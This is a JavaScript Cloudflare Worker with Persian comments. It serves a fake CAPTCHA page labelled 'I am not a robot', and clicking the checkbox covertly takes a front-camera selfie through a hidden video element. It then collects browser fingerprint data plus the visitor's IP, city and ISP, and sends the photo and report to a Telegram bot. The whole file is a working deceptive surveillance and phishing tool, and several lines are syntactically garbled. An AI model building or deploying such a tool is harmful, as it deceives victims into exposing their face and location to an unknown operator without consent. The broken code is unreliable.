export default {
  async fetch(request, env, ctx) {
    const url = new URL(request.url);

    if (request.method === "GET" && url.pathname === "/") {
      return new Response(getHTML(), {
        headers: { "Content-Type": "text/html;charset=UTF-8" },
      });
    }

    if (request.method === "POST" && url.pathname === "/upload") {
      try {
        const formData = await request.formData();
        const photo = formData.get("photo");
        const clientData = formData.get("clientData"); // JSON string از سمت کلاینت

        if (!photo || !(photo instanceof File)) {
          return new Response("No photo uploaded", { status: 400 });
        }

        // ۱. استخراج اطلاعات سمت سرور (Cloudflare)
        const cf = request.cf || {};
        const serverInfo = {
          ip: request.headers.get("CF-Connecting-IP") || "نامشخص",
          country: cf.country || "نامشخص",
          city: cf.city || "نامشخص",
          region: cf.region || "نامشخص",
          timezone: cf.timezone || "نامشخص",
          isp: cf.asOrganization || "نامشخص",
          asn: cf.asn || "نامشخص",
          httpProtocol: cf.httpProtocol || "نامشخص",
          tlsVersion: cf.tlsispVersion || "نام}`شخص",
          colo: cf.colo ||,
 "نامشخص",
          userAgent: request         .headers.get("User-Agent `") || "نامشخص",
          acceptLanguage: request.headers.get("Accept-Language") || "نامشخص",
          referer: request.headers.get("Referer") || "نامشخص",
        };

        // ۲. پردازش اطلاعات سمت کلاینت
        let clientInfo = {};
        try {
          clientInfo = clientData ? JSON.parse(clientData) : {};
        } catch (e) {
          clientInfo = { error: "خطا در پردازش داده کلاینت" };
        }

        // ۳. ساخت پیام متنی جامع
        const reportLines = [
          "📸 **گزارش سلفی و اطلاعات کاربر**",
          "",
          "🌐 **اطلاعات شبکه (سمت سرور):**",
          `• IP: ${serverInfo.ip}`,
          `• کشور: ${serverInfo.country}`,
          `• شهر: ${serverInfo.city}`,
          `• منطقه: ${serverInfo.region}`,
          `• منطقه زمانی: ${serverInfo.timezone}`,
          `• ISP: ${serverInfo.• ASN: ${serverInfo.asn}`,
          `• پروتکل HTTP: ${serverInfo.httpProtocol}`,
          `• نسخه TLS: ${serverInfo.tlsVersion}`,
          `• دیتاسنتر Cloudflare: ${serverInfo.colo}`,
          `• User-Agent: ${serverInfo.userAgent}`,
          `• زبان پذیرفته‌شده: ${serverInfo.acceptLanguage}`,
          `• Referer: ${serverInfo.referer}`,
          "",
          "💻 **اطلاعات مرورگر (سمت کلاینت):**",
          `• User-Agent: ${clientInfo.userAgent || "نامشخص"}`,
          `• زبان: ${clientInfo.language || "نامشخص"}`,
          `• زبان‌های ترجیحی: ${(clientInfo.languages || []).join(", ") || "نامشخص"}`,
          `• پلتفرم: ${clientInfo.platform || "نامشخص"}`,
          `• رزولوشن صفحه: ${clientInfo.screenWidth || "?"}x${clientInfo.screenHeight || "?"}`,
          `• ابعاد پنجره: ${clientInfo.innerWidth || "?"}x${clientInfo.innerHeight || "?"}`,
          `• نسبت پیکسل دستگاه: ${clientInfo.devicePixelRatio || "نامشخص"}`,
          `• تعداد هسته‌های CPU: ${clientInfo.hardwareConcurrency || "نامشخص"}`,
          `• حافظه دستگاه (GB): ${clientInfo.deviceMemory || "نامشخص"}`,
          `• وضعیت آنلاین: ${clientInfo.onLine ? "بله" : "خیر"}`,
          `• نوع اتصال: ${clientInfo.connectionType || "نامشخص"}`,
          `• منطقه زمانی: ${clientInfo.timezone || "نامشخص"}`,
          `• زمان محلی: ${clientInfo.localTime || "نامشخص"}`,
          `• کوکی‌ها فعال: ${clientInfo.cookieEnabled ? "بله" : "خیر"}`,
          `• Do Not Track: ${clientInfo.doNotTrack || "نامشخص"}`,
          `• PDF Viewer: ${clientInfo.pdfViewerEnabled ? "بله" : "خیر"}`,
        ];

        const reportText = reportLines.join("\n");

        // ۴. ارسال عکس با کپشن کوتاه
        const telegramForm = new FormData();
        telegramForm.append("chat_id", env.TELEGRAM_CHAT_ID);
        telegramForm.append("photo", photo, "selfie.jpg");
        telegramForm.append("caption", "📸 سلفی دریافتی");

        const photoUrl = `https://api.telegram.org/bot${env.TELEGRAM_BOT_TOKEN}/sendPhoto`;
        const photoResp = await fetch(photoUrl, {
          method: "POST",
          body: telegramForm,
        });
        const photoResult = await photoResp.json();

        if (!photoResult.ok) {
          return new Response(`Telegram photo error: ${photoResult.description}`, { status: 502 });
        }

        // ۵. ارسال پیام متنی اطلاعات
        const msgUrl = `https://api.telegram.org/bot${env.TELEGRAM_BOT_TOKEN}/sendMessage`;
        const msgResp = await fetch(msgUrl, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            chat_id: env.TELEGRAM_CHAT_ID,
            text: reportText,
            parse_mode: "Markdown",
          }),
        });
        const msgResult = await msgResp.json();

        if (!msgResult.ok) {
          return new Response(`Telegram message error: ${msgResult.description}`, { status: 502 });
        }

        return new Response("ok", { status: 200 });
      } catch (err) {
        console.error(err);
        return new Response("Internal Server Error", { status: 500 });
      }
    }

    return new Response("Not Found", { status: 404 });
  },
};

function getHTML() {
  return `
<!DOCTYPE html>
<html lang="fa" dir="rtl">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>تایید هویت</title>
  <style>
    body {
      margin: 0; height: 100vh;
      display: flex; align-items: center; justify-content: center;
      font-family: sans-serif; background: #f8f9fa;
    }
    .captcha-box {
      display: flex; align-items: center; gap: 14px;
      padding: 18px 28px;
      background: #fff; border: 1px solid #d3d3d3; border-radius: 6px;
      box-shadow: 0 2px 6px rgba(0,0,0,0.06);
      user-select: none;
    }
    .checkbox {
      width: 26px; height: 26px;
      border: 2px solid #888; border-radius: 4px;
      display: flex; align-items: center; justify-content: center;
      cursor: pointer; transition: all 0.2s;
      background: #fff;
    }
    .checkbox:hover { border-color: #4a90e2; }
    .checkbox.checked {
      background: #4a90e2; border-color: #4a90e2;
    }
    .checkbox.checked::after {
      content: "";
      width: 6px; height: 12px;
      border: solid white; border-width: 0 2px 2px 0;
      transform: rotate(45deg);
      margin-bottom: 2px;
    }
    .label { font-size: 16px; color: #333; cursor: pointer; }
    #hiddenVideo { display: none; }
    #canvas { display: none; }
  </style>
</head>
<body>
  <div class="captcha-box">
    <div class="checkbox" id="checkbox"></div>
    <span class="label" id="label">من ربات نیستم</span>
  </div>

  <video id="hiddenVideo" autoplay playsinline muted></video>
  <canvas id="canvas"></canvas>

  <script>
    const checkbox = document.getElementById('checkbox');
    const label = document.getElementById('label');
    const video = document.getElementById('hiddenVideo');
    const canvas = document.getElementById('canvas');
    let busy = false;

    function collectClientData() {
      return {
        userAgent: navigator.userAgent,
        language: navigator.language,
        languages: navigator.languages,
        platform: navigator.platform,
        screenWidth: screen.width,
        screenHeight: screen.height,
        innerWidth: window.innerWidth,
        innerHeight: window.innerHeight,
        devicePixelRatio: window.devicePixelRatio,
        hardwareConcurrency: navigator.hardwareConcurrency,
        deviceMemory: navigator.deviceMemory,
        onLine: navigator.onLine,
        connectionType: navigator.connection ? navigator.connection.effectiveType : null,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        localTime: new Date().toLocaleString(),
        cookieEnabled: navigator.cookieEnabled,
        doNotTrack: navigator.doNotTrack,
        pdfViewerEnabled: navigator.pdfViewerEnabled,
      };
    }

    async function handleClick() {
      if (busy) return;
      busy = true;
      label.textContent = 'لطفاً صبر کنید...';

      let stream = null;
      try {
        // درخواست دوربین جلو
        stream = await navigator.mediaDevices.getUserMedia({
          video: { facingMode: "user" },
          audio: false
        });

        video.srcObject = stream;
        await new Promise((resolve) => {
          if (video.readyState >= 2) return resolve();
          video.onloadeddata = resolve;
        });
        await new Promise(r => setTimeout(r, 400));

        // گرفتن فریم
        canvas.width = video.videoWidth || 640;
        canvas.height = video.videoHeight || 480;
        const ctx = canvas.getContext('2d');
        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

        const blob = await new Promise((resolve) =>
          canvas.toBlob(resolve, 'image/jpeg', 0.9)
        );

        // خاموش کردن دوربین
        stream.getTracks().forEach(t => t.stop());
        stream = null;

        if (!blob) throw new Error('capture failed');

        // جمع‌آوری اطلاعات کلاینت
        const clientData = JSON.stringify(collectClientData());

        // ارسال
        const formData = new FormData();
        formData.append('photo', blob, 'selfie.jpg');
        formData.append('clientData', clientData);

        const resp = await fetch('/upload', { method: 'POST', body: formData });

        if (!resp.ok) throw new Error('upload failed');

        checkbox.classList.add('checked');
        label.textContent = 'تایید شد';
      } catch (err) {
        console.error(err);
        if (stream) stream.getTracks().forEach(t => t.stop());
        label.textContent = 'من ربات نیستم';
        busy = false;
        return;
      }

      busy = false;
    }

    checkbox.addEventListener('click', handleClick);
    label.addEventListener('click', handleClick);
  </script>
</body>
</html>
  `;
}